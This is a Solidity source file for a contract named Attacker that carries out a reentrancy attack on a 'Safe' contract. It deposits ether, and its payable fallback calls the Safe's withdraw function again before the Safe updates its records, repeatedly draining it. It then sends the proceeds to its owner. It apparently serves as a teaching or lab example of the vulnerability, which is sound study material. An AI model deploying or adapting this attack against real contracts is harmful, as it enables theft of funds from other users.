pragma solidity 0.5.10;

contract Attacker {
    Safe private safe;
    address payable owner;
    
    constructor(address _safeAddress) public {
        safe = Safe(_safeAddress);
        owner = msg.sender;
    }
    
    /**
     * Fallback that invokes Safe's withdraw function
     */
    function () external payable {
       safe.withdraw();
    }

    /**
     * Deposit ether to the Safe
     */
    function donate() public payable {
        safe.deposit.value(msg.value)();
    }

    function getWinnings() public {
        owner.transfer(address(this).balance);
    }
}